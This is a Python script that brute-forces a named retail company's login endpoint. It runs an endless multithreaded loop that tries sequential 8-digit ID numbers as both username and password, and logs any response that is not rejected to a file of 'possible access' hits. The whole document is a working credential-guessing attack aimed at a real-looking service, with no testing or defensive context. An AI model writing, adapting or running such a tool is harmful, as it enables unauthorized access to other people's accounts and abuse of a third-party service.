from colorama import init,Fore,Back,Style
from datetime import datetime
import requests, os
import json
import time
#from __future__ import print_function # so works on Python 2 and 3 alike
from colors import red, green, blue
from threading import Thread, Barrier

def login():
	flag = True
	global user
	s = requests.Session()
	payload = {
		'password':user,
		'username':user
	}
	_headers = { 'Content-Type': 'application/json'}

	res = s.post('https://login.cloudintercorpretail.pe/auth/login', json = payload, headers=_headers)
	#s.headers.update({'authorization':json.loads(res.content)['token']})
	p = res.content
	#print(p)
	if "UNAUTHORIZED" in str(p):
		txt = " --->       " + str(user) + " UNAUTHORIZED "
		print(red(txt))
	
	elif "500" in str(p):
		#user = user - 1
		flag = False
		print("reseteando este")
	else:
		txt = " --->       " + str(user) + "   Posible acceso "
		print(p)
		print(green(txt))
		posibles = open("posiblesacces.txt","a")
		posibles.write(str(user) + " | " + str(p))
		posibles.write("\n")
		posibles.close()
	if flag:
		user = user + 1


if __name__ == '__main__':
	init()
	user = 40022086 
	user =    input("user   : ")
	user = int(user)
	threads = []
	#workers = 1 
	workers = input("Workers: ")

	def main():
		session = login()
		
	while(True):
		for _ in range (int(workers)):
		    i = Thread(target=main)
		    threads.append(i)
		    i.start()     

		for i in threads:
		    i.join()